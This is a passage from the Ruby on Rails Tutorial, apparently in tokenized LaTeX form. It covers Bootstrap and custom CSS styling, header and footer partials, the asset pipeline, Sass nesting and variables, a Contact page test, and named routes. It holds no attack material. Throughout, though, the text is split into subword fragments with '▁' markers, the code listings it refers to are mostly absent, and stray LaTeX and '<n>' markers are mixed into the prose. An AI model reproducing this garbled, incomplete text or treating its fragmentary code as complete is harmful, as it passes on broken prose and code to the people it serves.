▁( We ▁won ' t ▁be ▁using ▁Sass ▁un til ▁Section ~\ ref { sec : sass }, ▁but ▁it ' s ▁needed ▁now ▁for ▁the ▁\ text tt { bootstrap - sass } ▁gem ▁to ▁work ▁its ▁magic .)
▁In side ▁the ▁file ▁for ▁the ▁custom ▁CSS , ▁we ▁can ▁use ▁the ▁\ k ode {@ import } ▁function ▁to ▁include ▁Bootstrap ▁( together ▁with ▁the ▁ associated ▁Sprockets ▁utility ), ▁as ▁show n ▁in ▁Listing ~\ ref { code : bootstrap _ css }
▁If ▁these ▁steps ▁seem ▁mysterious , ▁take ▁he ar t : ▁I ' m ▁just ▁following ▁the ▁instructions ▁from ▁the ▁\ href { https :// github . com / t w b s / bootstrap - sass # bootstrap - for - sass --- }{ bootstrap - sass ▁README ▁file }.
▁ Adding ▁Bootstrap ▁CSS .
▁The ▁two ▁lines ▁in ▁Listing ~\ ref { code : bootstrap _ css } ▁include ▁the ▁entire ▁Bootstrap ▁CSS ▁framework .
▁After ▁restart ing ▁the ▁web ▁server ▁to ▁incorporate ▁the ▁changes ▁into ▁the ▁development ▁application ▁( by ▁press ing ▁ Ctrl - C ▁and ▁the n ▁running ▁\ k ode { rails ▁server } ▁as ▁in ▁Section ~\ ref { sec : rails _ server }), ▁the ▁results ▁appear ▁as ▁in ▁F igure ~\ ref { fig : sample _ app _ only _ bootstrap }.
▁The ▁place ment ▁of ▁the ▁text ▁is n ' t ▁good ▁and ▁the ▁ logo ▁does n ' t ▁have ▁any ▁style , ▁but ▁the ▁color s ▁and ▁signup ▁button ▁look ▁pro m is ing .
▁Next ▁we ' ll ▁add ▁some ▁CSS ▁that ▁will ▁be ▁used ▁site - wide ▁for ▁styling ▁the ▁layout ▁and ▁each ▁individual ▁page , ▁as ▁show n ▁in ▁Listing ~\ ref { code : universal _ css }.
▁The ▁result ▁is ▁show n ▁in ▁F igure ~\ ref { fig : sample _ app _ universal }.
▁ Adding ▁CSS ▁for ▁some ▁ universal ▁styling ▁apply ing ▁to ▁all ▁pages .
▁/ * ▁ universal ▁* /
▁ Adding ▁some ▁ spacing ▁and ▁other ▁ universal ▁styling .
▁Note ▁that ▁the ▁CSS ▁in ▁Listing ~\ ref { code : universal _ css } ▁has ▁a ▁consistent ▁form .
▁In ▁general , ▁CSS ▁rules ▁refer ▁either ▁to ▁a ▁class , ▁an ▁id , ▁an ▁HTML ▁tag , ▁or ▁some ▁combination ▁there of , ▁followed ▁by ▁a ▁list ▁of ▁styling ▁commands .
▁For ▁example ,
▁put s ▁ 60 ~ p i x el s ▁of ▁p adding ▁at ▁the ▁to p ▁of ▁the ▁page .
▁Because ▁of ▁the ▁\ line break ▁\ k ode { navbar - fixed - to p } ▁class ▁in ▁the ▁\ k ode { header } ▁tag , ▁Bootstrap ▁fix es ▁the ▁navigation ▁bar ▁to ▁the ▁to p ▁of ▁the ▁page , ▁so ▁the ▁p adding ▁serve s ▁to ▁separate ▁the ▁main ▁text ▁from ▁the ▁navigation .
▁( Because ▁the ▁default ▁ navbar ▁color ▁changed ▁after ▁Bootstrap ▁2 . 0, ▁we ▁need ▁the ▁\ k ode { navbar - inverse } ▁class ▁to ▁make ▁it ▁d ar k ▁instead ▁of ▁light .)
▁ Meanwhile , ▁the ▁CSS ▁in ▁the ▁rule
▁associate s ▁the ▁\ k ode { center } ▁class ▁with ▁the ▁\ k ode { text - al ig n : ▁ center } ▁property .
▁In ▁other ▁words , ▁the ▁do t ▁\ k ode { . } ▁in ▁\ k ode { . center } ▁indicates ▁that ▁the ▁rule ▁style s ▁a ▁class .
▁This ▁means ▁that ▁elements ▁inside ▁any ▁tag ▁( such ▁as ▁a ▁\ k ode { div }) ▁with ▁class ▁\ k ode { center } ▁will ▁be ▁ center ed ▁on ▁the ▁page .
▁( We ▁saw ▁an ▁example ▁of ▁this ▁class ▁in ▁Listing ~\ ref { code : signup _ button }. )
▁A lthough ▁Bootstrap ▁comes ▁with ▁CSS ▁rules ▁for ▁nice ▁ typography , ▁we ' ll ▁also ▁add ▁some ▁custom ▁rules ▁for ▁the ▁appearance ▁of ▁the ▁text ▁on ▁our ▁site , ▁as ▁show n ▁in ▁Listing ~\ ref { code : typography _ css }.
▁( N o t ▁all ▁of ▁these ▁rules ▁apply ▁to ▁the ▁Home ▁page , ▁but ▁each ▁rule ▁here ▁will ▁be ▁used ▁at ▁some ▁point ▁in ▁the ▁sample ▁application .)
▁The ▁result ▁of ▁Listing ~\ ref { code : typography _ css } ▁is ▁show n ▁in ▁F igure ~\ ref { fig : sample _ app _ typography }.
▁ Adding ▁CSS ▁for ▁nice ▁ typography .
▁/ * ▁ typography ▁* /
▁ Adding ▁some ▁t y p ographic ▁styling .
▁F inally , ▁we ' ll ▁add ▁some ▁rules ▁to ▁style ▁the ▁site ' s ▁ logo , ▁which ▁simply ▁consist s ▁of ▁the ▁text ▁`` sample ▁app ''.
▁The ▁CSS ▁in ▁Listing ~\ ref { code : logo _ css } ▁convert s ▁the ▁text ▁to ▁upper case ▁and ▁ mod if ies ▁its ▁size , ▁color , ▁and ▁place ment .
▁( We ' ve ▁used ▁a ▁CSS ~ id ▁because ▁we ▁expect ▁the ▁site ▁ logo ▁to ▁appear ▁on ▁the ▁page ▁only ▁once , ▁but ▁you ▁could ▁use ▁a ▁class ▁instead .)
▁ Adding ▁CSS ▁for ▁the ▁site ▁ logo .
▁/ * ▁header ▁* /
▁HTML ▁color s ▁can ▁be ▁code d ▁with ▁three ▁pair s ▁of ▁base - 16 ▁( h ex a de ci m al ) ▁number s , ▁one ▁each ▁for ▁the ▁primary ▁color s ▁re d , ▁green , ▁and ▁b l ue ▁( in ▁that ▁order ).
▁The ▁code
▁The ▁result ▁of ▁the ▁CSS ▁in ▁Listing ~\ ref { code : logo _ css } ▁is ▁show n ▁in ▁F igure ~\ ref { fig : sample _ app _ logo }.
▁The ▁sample ▁app ▁with ▁nicely ▁style d ▁ logo .
▁A lthough ▁the ▁layout ▁in ▁Listing ~\ ref { code : layout _ new _ structure } ▁serve s ▁its ▁purpose , ▁it ' s ▁getting ▁a ▁little ▁cl u tt er ed .
▁The ▁HTML ▁ shim ▁take s ▁up ▁three ▁lines ▁and ▁uses ▁we ir d ▁I E - specific ▁syntax , ▁so ▁it ▁would ▁be ▁nice ▁to ▁t uck ▁it ▁a way ▁some where ▁on ▁its ▁own .
▁In ▁addition , ▁the ▁header ▁HTML ▁forms ▁a ▁logic al ▁ unit , ▁so ▁it ▁should ▁all ▁be ▁package d ▁up ▁in ▁one ▁place .
▁The ▁way ▁to ▁achieve ▁this ▁in ▁Rails ▁is ▁to ▁use ▁a ▁facilit y ▁called ▁\ emph { partial s }.
▁Let ' s ▁first ▁take ▁a ▁look ▁at ▁what ▁the ▁layout ▁look s ▁like ▁after ▁the ▁partials ▁are ▁defined ▁( Listing ~\ ref { code : layout _ with _ partial s }).
▁The ▁site ▁layout ▁with ▁partials ▁for ▁the ▁stylesheets ▁and ▁header .
▁In ▁Listing ~\ ref { code : layout _ with _ partial s }, ▁we ' ve ▁replaced ▁the ▁HTML ▁ shim ▁stylesheet ▁lines ▁with ▁a ▁single ▁call ▁to ▁a ▁Rails ▁helper ▁called ▁\ k ode { render } :
▁M any ▁Rails ▁developers ▁use ▁a ▁\ k ode { shared } ▁directory ▁for ▁partials ▁ shared ▁across ▁different ▁views .
▁I ▁prefer ▁to ▁use ▁the ▁\ k ode { shared } ▁folder ▁for ▁utility ▁partials ▁that ▁are ▁useful ▁on ▁multiple ▁views , ▁while ▁ putting ▁partials ▁that ▁are ▁literal ly ▁on ▁every ▁page ▁( as ▁part ▁of ▁the ▁site ▁layout ) ▁in ▁the ▁\ k ode { layouts } ▁directory .
▁( We ' ll ▁create ▁the ▁\ k ode { shared } ▁directory ▁starting ▁in ▁Chapter ~\ ref { cha : sign _ up }. )
▁That ▁seem s ▁to ▁me ▁a ▁logic al ▁division , ▁but ▁ putting ▁them ▁all ▁in ▁the ▁\ k ode { shared } ▁folder ▁certain ly ▁works ▁fine , ▁too .
▁Of ▁course , ▁to ▁get ▁the ▁partial ▁to ▁work , ▁we ▁have ▁to ▁create ▁the ▁corresponding ▁file ▁and ▁fill ▁it ▁with ▁some ▁content .
▁In ▁the ▁case ▁of ▁the ▁ shim ▁partial , ▁this ▁is ▁just ▁the ▁three ▁lines ▁of ▁ shim ▁code ▁from ▁Listing ~\ ref { code : layout _ new _ structure }.
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : stylesheets _ partial }
▁A ▁partial ▁for ▁the ▁HTML ▁ shim .
▁Similar ly , ▁we ▁can ▁move ▁the ▁header ▁material ▁into ▁the ▁partial ▁show n ▁in ▁Listing ~\ ref { code : header _ partial } ▁and ▁insert ▁it ▁into ▁the ▁layout ▁with ▁another ▁call ▁to ▁\ k ode { render }.
▁( As ▁usual ▁with ▁partials , ▁you ▁will ▁have ▁to ▁create ▁the ▁file ▁by ▁hand ▁using ▁your ▁text ▁editor .)
▁A ▁partial ▁for ▁the ▁site ▁header .
▁Now ▁that ▁we ▁know ▁how ▁to ▁make ▁partials , ▁let ' s ▁add ▁a ▁site ▁ footer ▁to ▁go ▁along ▁with ▁the ▁header .
▁You ▁may ▁won d er ▁why ▁we ▁use ▁both ▁the ▁\ k ode { footer } ▁tag ▁and ▁\ k ode { . footer } ▁class .
▁The ▁an s w er ▁is ▁that ▁the ▁tag ▁has ▁a ▁clear ▁meaning ▁to ▁human ▁readers , ▁and ▁the ▁class ▁is ▁used ▁by ▁Bootstrap .
▁Using ▁a ▁\ k ode { div } ▁tag ▁in ▁place ▁of ▁\ k ode { footer } ▁would ▁work ▁as ▁well .
▁A ▁partial ▁for ▁the ▁site ▁ footer .
▁< small >
▁ Michael ▁Hartl
▁</ small >
▁</ footer >
▁About
▁Contact
▁( As ▁with ▁\ k ode { header }, ▁the ▁\ k ode { footer } ▁tag ▁is ▁new ▁in ▁HTML 5 .)
▁We ▁can ▁render ▁the ▁ footer ▁partial ▁in ▁the ▁layout ▁by ▁following ▁the ▁same ▁pattern ▁as ▁the ▁stylesheets ▁and ▁header ▁partials ▁( Listing ~\ ref { code : layout _ with _ footer }).
▁The ▁site ▁layout ▁with ▁a ▁ footer ▁partial .
▁Of ▁course , ▁the ▁ footer ▁will ▁be ▁ugly ▁without ▁some ▁styling ▁( Listing ~\ ref { code : footer _ css }).
▁The ▁results ▁appear ▁in ▁F igure ~\ ref { fig : site _ with _ footer }.
▁ Adding ▁the ▁CSS ▁for ▁the ▁site ▁ footer .
▁/ * ▁ footer ▁* /
▁The ▁Home ▁page ▁with ▁an ▁added ▁ footer .
▁One ▁of ▁the ▁most ▁not able ▁addition s ▁in ▁ recent ▁versions ▁of ▁Rails ▁is ▁the ▁\ emph { asset ▁pipeline }, ▁which ▁significant ly ▁improve s ▁the ▁production ▁and ▁manage ment ▁of ▁static ▁assets ▁such ▁as ▁CSS , ▁JavaScript , ▁and ▁images .
▁This ▁section ▁first ▁gives ▁a ▁high - level ▁ overview ▁of ▁the ▁asset ▁pipeline , ▁and ▁the n ▁shows ▁how ▁to ▁use ▁\ emph { S as s }, ▁a ▁powerful ▁tool ▁for ▁writing ▁CSS .
▁The ▁asset ▁pipeline ▁involve s ▁lot s ▁of ▁changes ▁under ▁Rails ' ▁hood , ▁but ▁from ▁the ▁per spec tive ▁of ▁a ▁typical ▁Rails ▁developer ▁there ▁are ▁three ▁principal ▁features ▁to ▁understand : ▁asset ▁directories , ▁manifest ▁files , ▁and ▁pre process or ▁engines
▁The ▁structure ▁of ▁this ▁section ▁is ▁base d ▁on ▁the ▁excellent ▁blog ▁post ▁`` The ▁Rails ▁3 ▁ Asset ▁Pipeline ▁in ▁( about ) ▁5 ▁M in ute s '' ▁by ▁ Michael ▁E ra s m us .
▁For ▁more ▁details , ▁see ▁the ▁\ href { http :// guides . rubyonrails . org / asset _ pipeline . html }{ Rails ▁G u id e ▁on ▁the ▁ Asset ▁Pipeline }.
▁Let ' s ▁consider ▁each ▁in ▁turn .
▁ Asset ▁directories
▁In ▁Rails ▁version ▁3.0 ▁and ▁earlier , ▁static ▁assets ▁live d ▁in ▁the ▁\ k ode { public / } ▁directory , ▁as ▁follows :
▁File s ▁in ▁these ▁directories ▁are ▁( even ▁post - 3 . 0 ) ▁automatically ▁served ▁up ▁via ▁requests ▁to ▁ http :// www . example . com / stylesheets , ▁etc .
▁In ▁the ▁latest ▁version ▁of ▁Rails , ▁there ▁are ▁\ emph { th re e } ▁canonical ▁directories ▁for ▁static ▁assets , ▁each ▁with ▁its ▁own ▁purpose :
▁\ k ode { app / assets } : ▁assets ▁specific ▁to ▁the ▁present ▁application
▁\ k ode { lib / assets } : ▁assets ▁for ▁libraries ▁written ▁by ▁your ▁ dev ▁team
▁\ k ode { vendor / assets } : ▁assets ▁from ▁third - part y ▁ vendor s
▁As ▁you ▁m ight ▁guess , ▁each ▁of ▁these ▁directories ▁has ▁a ▁subdirectory ▁for ▁each ▁asset ▁class , ▁e . g . ,
▁M an if est ▁files
▁On ce ▁you ' ve ▁placed ▁your ▁assets ▁in ▁their ▁logic al ▁location s , ▁you ▁can ▁use ▁\ emph { ma n if est ▁files } ▁to ▁tell ▁Rails ▁( via ▁the ▁\ href { https :// github . com / s st e phens on / sprockets }{ Sprockets } ▁gem ) ▁how ▁to ▁combine ▁them ▁to ▁form ▁single ▁files .
▁( This ▁applies ▁to ▁CSS ▁and ▁JavaScript ▁but ▁not ▁to ▁images .)
▁As ▁an ▁example , ▁let ' s ▁take ▁a ▁look ▁at ▁the ▁default ▁manifest ▁file ▁for ▁app ▁stylesheets ▁( Listing ~\ ref { code : app _ css _ ma n if est }).
▁The ▁manifest ▁file ▁for ▁app - specific ▁CSS .
▁You ' re ▁free ▁to ▁add
▁< n > ▁* = ▁require _ tree ▁ .
▁< n > ▁* = ▁require _ self
▁The ▁key ▁lines ▁here ▁are ▁actually ▁CSS ▁comments , ▁but ▁they ▁are ▁used ▁by ▁Sprockets ▁to ▁include ▁the ▁proper ▁files :
▁< n > * = ▁require _ tree ▁ .
▁ensure s ▁that ▁all ▁CSS ▁files ▁in ▁the ▁\ k ode { app / assets / stylesheets } ▁directory ▁( including ▁the ▁ tree ▁subdirectories ) ▁are ▁included ▁into ▁the ▁application ▁CSS . ▁The ▁line
▁< n > * = ▁require _ self
▁specifie s ▁where ▁in ▁the ▁load ing ▁sequence ▁the ▁CSS ▁in ▁\ k ode { application . css } ▁itself ▁get s ▁included .
▁Rails ▁comes ▁with ▁ s en s i b le ▁default ▁manifest ▁files , ▁and ▁in ▁the ▁\ emph { Rails ▁Tutorial } ▁we ▁won ' t ▁need ▁to ▁make ▁any ▁changes , ▁but ▁the ▁\ href { http :// guides . rubyonrails . org / asset _ pipeline . html }{ Rails ▁G u id es ▁entry ▁on ▁the ▁asset ▁pipeline } ▁has ▁more ▁detail ▁if ▁you ▁need ▁it .
▁P re process or ▁engines
▁After ▁you ' ve ▁as s em b l ed ▁your ▁assets , ▁Rails ▁ prepare s ▁them ▁for ▁the ▁site ▁template ▁by ▁running ▁them ▁through ▁sever al ▁pre process ing ▁engines ▁and ▁using ▁the ▁manifest ▁files ▁to ▁combine ▁them ▁for ▁delivery ▁to ▁the ▁browser .
▁We ▁tell ▁Rails ▁which ▁process or ▁to ▁use ▁using ▁filename ▁extensions ; ▁the ▁three ▁most ▁common ▁cases ▁are ▁\ k ode { . scss } ▁for ▁Sass , ▁\ k ode { . coffee } ▁for ▁CoffeeScript , ▁and ▁\ k ode { . erb } ▁for ▁ embedded ▁Ruby ▁( ER b ).
▁We ▁first ▁covered ▁ERb ▁in ▁Section ~\ ref { sec : layouts _ and _ embedded _ ruby }, ▁and ▁cover ▁Sass ▁in ▁Section ~\ ref { sec : sass }.
▁We ▁won ' t ▁be ▁need ing ▁CoffeeScript ▁in ▁this ▁tutorial , ▁but ▁it ' s ▁an ▁elegant ▁little ▁language ▁that ▁ compile s ▁to ▁JavaScript .
▁( The ▁\ href { http :// r ailscasts . com / episodes / 2 6 7 - coffee script - basic s }{ RailsCast ▁on ▁CoffeeScript ▁basic s } ▁is ▁a ▁good ▁place ▁to ▁start .)
▁The ▁pre process or ▁engines ▁can ▁be ▁chain ed , ▁so ▁that
▁get s ▁run ▁through ▁the ▁CoffeeScript ▁process or , ▁and
▁get s ▁run ▁through ▁both ▁CoffeeScript ▁and ▁ERb ▁( with ▁the ▁code ▁running ▁from ▁right ▁to ▁left , ▁i . e . , ▁CoffeeScript ▁first ).
▁E ff ic i en c y ▁in ▁production
▁One ▁of ▁the ▁best ▁things ▁about ▁the ▁asset ▁pipeline ▁is ▁that ▁it ▁automatically ▁results ▁in ▁assets ▁that ▁are ▁optimized ▁to ▁be ▁ efficient ▁in ▁a ▁production ▁application .
▁T ra d it ion al ▁methods ▁for ▁ org an i z ing ▁CSS ▁and ▁JavaScript ▁involve ▁ split ting ▁functionality ▁into ▁separate ▁files ▁and ▁using ▁nice ▁format ting ▁( with ▁lot s ▁of ▁indentation ).
▁Whi le ▁convenient ▁for ▁the ▁programmer , ▁this ▁is ▁in efficient ▁in ▁production .
▁In ▁particular , ▁including ▁multiple ▁full - size d ▁files ▁can ▁significant ly ▁ s low ▁page - load ▁time s , ▁which ▁is ▁one ▁of ▁the ▁most ▁important ▁factor s ▁a ffect ing ▁the ▁ quality ▁of ▁the ▁user ▁experience .
▁With ▁the ▁asset ▁pipeline , ▁we ▁don ' t ▁have ▁to ▁choose ▁between ▁speed ▁and ▁convenience : ▁we ▁can ▁work ▁with ▁multiple ▁nicely ▁ formatted ▁files ▁in ▁development , ▁and ▁the n ▁use ▁the ▁asset ▁pipeline ▁to ▁make ▁ efficient ▁files ▁in ▁production .
▁In ▁particular , ▁the ▁asset ▁pipeline ▁combine s ▁all ▁the ▁application ▁stylesheets ▁into ▁one ▁CSS ▁file ▁(\ k ode { application . css }), ▁combine s ▁all ▁the ▁application ▁JavaScript ▁into ▁one ▁JavaScript ▁file ▁(\ k ode { application . js }), ▁and ▁the n ▁\ emph { mini f ies } ▁them ▁to ▁remove ▁the ▁unnecessary ▁ spacing ▁and ▁indentation ▁that ▁ blo at s ▁file ▁size .
▁The ▁result ▁is ▁the ▁best ▁of ▁both ▁world s : ▁convenience ▁in ▁development ▁and ▁e ff ic i en c y ▁in ▁production .
▁< n >< n > ▁% ▁subsection ▁the _ asset _ pipeline ▁( end )< n >< n > ▁\ subsection { S y n t ac tic ally ▁a we some ▁stylesheets } ▁% ▁( fold )< n > ▁\ label { sec : sass }< n >< n >
▁\ emph { S as s } ▁is ▁a ▁language ▁for ▁writing ▁stylesheets ▁that ▁improve s ▁on ▁CSS ▁in ▁many ▁ways .
▁In ▁this ▁section , ▁we ▁cover ▁two ▁of ▁the ▁most ▁important ▁improve ment s , ▁\ emph { n est ing } ▁and ▁\ emph { variable s }.
▁( A ▁third ▁technique , ▁\ emph { mixin s }, ▁is ▁introduce d ▁in ▁Section ~\ ref { sec : rails _ environments }. )
▁This ▁means ▁that ▁every ▁valid ▁CSS ▁file ▁is ▁also ▁a ▁valid ▁SCSS ▁file , ▁which ▁is ▁convenient ▁for ▁project s ▁with ▁existing ▁style ▁rules .
▁In ▁our ▁case , ▁we ▁used ▁SCSS ▁from ▁the ▁start ▁in ▁order ▁to ▁take ▁advantage ▁of ▁Bootstrap .
▁S ince ▁the ▁Rails ▁asset ▁pipeline ▁automatically ▁uses ▁Sass ▁to ▁process ▁files ▁with ▁the ▁\ k ode { . scss } ▁extension , ▁the ▁\ k ode { custom . css . scss } ▁file ▁will ▁be ▁run ▁through ▁the ▁Sass ▁pre process or ▁before ▁being ▁package d ▁up ▁for ▁delivery ▁to ▁the ▁browser .
▁A ▁common ▁pattern ▁in ▁stylesheets ▁is ▁ having ▁rules ▁that ▁apply ▁to ▁nested ▁elements .
▁For ▁example , ▁in ▁Listing ~\ ref { code : universal _ css } ▁we ▁have ▁rules ▁both ▁for ▁\ k ode { . center } ▁and ▁for ▁\ k ode { . center ▁h 1 } :
▁We ▁can ▁replace ▁this ▁in ▁Sass ▁with
▁Here ▁the ▁nested ▁\ k ode { h 1 } ▁rule ▁automatically ▁inherit s ▁the ▁\ k ode { . center } ▁context .
▁There ' s ▁a ▁second ▁can d id ate ▁for ▁nesting ▁that ▁requires ▁a ▁slightly ▁different ▁syntax .
▁In ▁Listing ~\ ref { code : logo _ css }, ▁we ▁have ▁the ▁code
▁Bo th ▁of ▁these ▁nesting ▁technique s ▁apply ▁to ▁the ▁ footer ▁CSS ▁in ▁Listing ~\ ref { code : footer _ css }, ▁which ▁can ▁be ▁ transform ed ▁into ▁the ▁following :
▁Convert ing ▁Listing ~\ ref { code : footer _ css } ▁by ▁hand ▁is ▁a ▁good ▁exercise , ▁and ▁you ▁should ▁verify ▁that ▁the ▁CSS ▁ still ▁works ▁properly ▁after ▁the ▁con version .
▁Sass ▁allows ▁us ▁to ▁define ▁\ emph { variable s } ▁to ▁eliminate ▁duplication ▁and ▁write ▁more ▁express ive ▁code .
▁For ▁example , ▁look ing ▁at ▁Listing ~\ ref { code : typography _ css } ▁and ▁Listing ~\ ref { code : footer _ css }, ▁we ▁see ▁that ▁there ▁are ▁repeated ▁reference s ▁to ▁the ▁same ▁color :
▁This ▁allows ▁us ▁to ▁re write ▁our ▁SCSS ▁like ▁this :
▁Inde ed , ▁the ▁Bootstrap ▁framework ▁defines ▁a ▁large ▁number ▁of ▁variables ▁for ▁color s , ▁available ▁online ▁on ▁the ▁\ href { http :// get bootstrap . com / custom ize / # less - variable s }{ Bootstrap ▁page ▁of ▁L es s ▁variables }.
▁That ▁page ▁defines ▁variables ▁using ▁L es s , ▁not ▁Sass , ▁but ▁the ▁\ text tt { bootstrap - sass } ▁gem ▁provides ▁the ▁Sass ▁equivalent s .
▁L oo k ing ▁at ▁the ▁Bootstrap ▁variable ▁page , ▁we ▁see ▁that ▁there ▁is ▁a ▁variable ▁for ▁light ▁gra y :
▁This ▁means ▁that
▁App ly ing ▁the ▁Sass ▁nesting ▁and ▁variable ▁definition ▁features ▁to ▁the ▁full ▁SCSS ▁file ▁gives ▁the ▁file ▁in ▁Listing ~\ ref { code : refactored _ scss }.
▁Note ▁in ▁particular ▁the ▁d ra ma tic ▁improve ment ▁in ▁the ▁rules ▁for ▁the ▁\ k ode { footer } ▁tag .
▁The ▁initial ▁SCSS ▁file ▁convert ed ▁to ▁use ▁nesting ▁and ▁variables .
▁/ * ▁ mixin s , ▁variables , ▁etc . ▁* /
▁Sass ▁gives ▁us ▁even ▁more ▁ways ▁to ▁simplif y ▁our ▁stylesheets , ▁but ▁the ▁code ▁in ▁Listing ~\ ref { code : refactored _ scss } ▁uses ▁the ▁most ▁important ▁features ▁and ▁gives ▁us ▁a ▁great ▁start .
▁See ▁the ▁\ href { http :// sass - lang . com /}{ S as s ▁website } ▁for ▁more ▁details .
▁Of ▁course , ▁we ▁could ▁hard - code ▁links ▁like
▁but ▁that ▁is n ' t ▁the ▁Rails ▁Way T M .
▁/ about
▁More over , ▁Rails ▁convention ally ▁uses ▁\ emph { name d ▁routes }, ▁which ▁involve s ▁code ▁like
▁This ▁way ▁the ▁code ▁has ▁a ▁more ▁tr an s parent ▁meaning , ▁and ▁it ' s ▁also ▁more ▁flexible ▁since ▁we ▁can ▁change ▁the ▁definition ▁of ▁\ k ode { about \_ path } ▁and ▁have ▁the ▁URL ▁change ▁every where ▁\ k ode { about \_ path } ▁is ▁used .
▁The ▁full ▁list ▁of ▁our ▁plan n ed ▁links ▁appears ▁in ▁Table ~\ ref { table : url _ m app ing }, ▁along ▁with ▁their ▁mapping ▁to ▁URLs ▁and ▁routes .
▁We ▁too k ▁care ▁of ▁the ▁first ▁route ▁in ▁Section ~\ ref { sec : set ting _ the _ root _ route }, ▁and ▁we ' ll ▁have ▁implemented ▁all ▁but ▁the ▁last ▁one ▁by ▁the ▁end ▁of ▁this ▁chapter .
▁( We ' ll ▁make ▁the ▁last ▁one ▁in ▁Chapter ~\ ref { cha : log _ in _ log _ out }. )
▁/ help
▁/ contact
▁/ signup
▁/ login
▁Route ▁and ▁URL ▁mapping ▁for ▁site ▁links .
▁\ label { table : url _ m app ing } }< n >\ end { table }< n >< n >\ subsection { Co n t ac t ▁page } ▁% ▁( fold )< n >\ label { sec : contact _ page }< n >< n >
▁For ▁completeness , ▁we ' ll ▁add ▁the ▁Contact ▁page , ▁which ▁was ▁left ▁as ▁an ▁exercise ▁in ▁Chapter ~\ ref { cha : static _ pages }.
▁The ▁test ▁appears ▁as ▁in ▁Listing ~\ ref { code : contact _ page _ test }, ▁which ▁simply ▁follows ▁the ▁model ▁last ▁seen ▁in ▁Listing ~\ ref { code : title _ tests }.
▁A ▁test ▁for ▁the ▁Contact ▁page .
▁" Ruby ▁on ▁Rails ▁Tutorial ▁S ample ▁App "
▁< n >< n > ▁test ▁" s h o ul d ▁get ▁help " ▁do < n > ▁get ▁: help < n > ▁ assert _ response ▁: success < n > ▁ assert _ select ▁" title ", ▁" H el p
▁| ▁Ruby ▁on ▁Rails ▁Tutorial ▁S ample ▁App
▁The ▁application ▁code ▁parallel s ▁the ▁addition ▁of ▁the ▁About ▁page ▁in ▁Section ~\ ref { sec : getting _ started _ with _ test ing } : ▁first ▁we ▁update ▁the ▁routes ▁( Listing ~\ ref { code : contact _ route }), ▁the n ▁we ▁add ▁a ▁\ k ode { contact } ▁action ▁to ▁the ▁Static ▁Pages ▁controller ▁( Listing ~\ ref { code : contact _ action }), ▁and ▁finally ▁we ▁create ▁a ▁Contact ▁view ▁( Listing ~\ ref { code : contact _ view }).
▁ Adding ▁a ▁route ▁for ▁the ▁Contact ▁page .
▁ Adding ▁an ▁action ▁for ▁the ▁Contact ▁page .
▁The ▁view ▁for ▁the ▁Contact ▁page .
▁Now ▁make ▁sure ▁that ▁the ▁tests ▁are ▁\ passing :
▁< n >\ end { code }< n >\ end { code listing }< n >< n > ▁% ▁subsection ▁route _ tests ▁( end )< n >< n > ▁\ subsection { Rails ▁routes } ▁% ▁( fold )< n > ▁\ label { sec : rails _ routes }< n >< n > To ▁add ▁the ▁named ▁routes ▁for ▁the ▁sample ▁app ' s ▁static ▁pages , ▁we ' ll ▁edit ▁the ▁routes ▁file , ▁\ k ode { config / \ - routes . rb }, ▁that ▁Rails ▁uses ▁to ▁define ▁URL ▁mapping s .
▁We ' ll ▁begin ▁by ▁review ing ▁the ▁route ▁for ▁the ▁Home ▁page ▁( defined ▁in ▁Section ~\ ref { sec : set ting _ the _ root _ route }), ▁which ▁is ▁a ▁special ▁case , ▁and ▁the n ▁define ▁a ▁set ▁of ▁routes ▁for ▁the ▁remain ing ▁static ▁pages .
▁So ▁far , ▁we ' ve ▁seen ▁three ▁examples ▁of ▁how ▁to ▁define ▁a ▁root ▁route , ▁starting ▁with ▁the ▁code
▁in ▁the ▁ hello ▁app ▁( Listing ~\ ref { code : hello _ root _ route }), ▁the ▁code
▁in ▁the ▁toy ▁app ▁( Listing ~\ ref { code : rails _ routes _ root _ route }), ▁and ▁the ▁code
▁in ▁the ▁sample ▁app ▁( Listing ~\ ref { code : home _ root _ route }).
▁In ▁each ▁case , ▁the ▁\ k ode { root } ▁method ▁arrange s ▁for ▁the ▁root ▁path ▁/ ▁to ▁be ▁route d ▁to ▁a ▁controller ▁and ▁action ▁of ▁our ▁choice .
▁Defin ing ▁the ▁root ▁route ▁in ▁this ▁way ▁has ▁a ▁second ▁important ▁effect , ▁which ▁is ▁to ▁create ▁named ▁routes ▁that ▁allow ▁us ▁to ▁refer ▁to ▁routes ▁by ▁a ▁name ▁rather ▁than ▁by ▁the ▁raw ▁URL . ▁In ▁this ▁case , ▁these ▁routes ▁are ▁\ k ode { root \_ path } ▁and ▁\ k ode { root \_ url }, ▁with ▁the ▁only ▁difference ▁being ▁that ▁the ▁latter ▁includes ▁the ▁full ▁URL :
▁In ▁the ▁\ emph { Rails ▁Tutorial }, ▁we ' ll ▁follow ▁the ▁common ▁convention ▁of ▁using ▁the ▁\ k ode { \_ path } ▁form ▁except ▁when ▁doing ▁redirect s , ▁where ▁we ' ll ▁use ▁the ▁\ k ode { \_ url } ▁form .
▁( This ▁is ▁because ▁the ▁HTTP ▁standard ▁technical ly ▁requires ▁a ▁full ▁URL ▁after ▁redirect s , ▁though ▁in ▁most ▁browsers ▁it ▁will ▁work ▁either ▁way .)
▁To ▁define ▁the ▁named ▁routes ▁for ▁the ▁Help , ▁About , ▁and ▁Contact ▁pages , ▁we ▁need ▁to ▁make ▁changes ▁to ▁the ▁\ k ode { get } ▁rules ▁from ▁Listing ~\ ref { code : contact _ route }, ▁ transform ing ▁lines ▁like
▁As ▁with ▁the ▁rule ▁for ▁the ▁root ▁route , ▁this ▁creates ▁two ▁named ▁routes , ▁\ k ode { help \_ path } ▁and ▁\ k ode { help \_ url } :
▁App ly ing ▁this ▁rule ▁change ▁to ▁the ▁remain ing ▁static ▁page ▁routes ▁from ▁Listing ~\ ref { code : contact _ route } ▁gives ▁Listing ~\ ref { code : static _ page _ routes }.
▁Routes ▁for ▁static ▁pages .
▁With ▁the ▁routes ▁defined ▁in ▁Listing ~\ ref { code : static _ page _ routes }, ▁we ' re ▁now ▁in ▁a ▁position ▁to ▁use ▁the ▁result ing ▁named ▁routes ▁in ▁the ▁site ▁layout .
▁This ▁simply ▁involve s ▁ filling ▁in ▁the ▁second ▁arguments ▁of ▁the ▁\ k ode { link \_ to } ▁functions ▁with ▁the ▁proper ▁named ▁routes .
▁For ▁example , ▁we ' ll ▁convert
▁and ▁so ▁on .
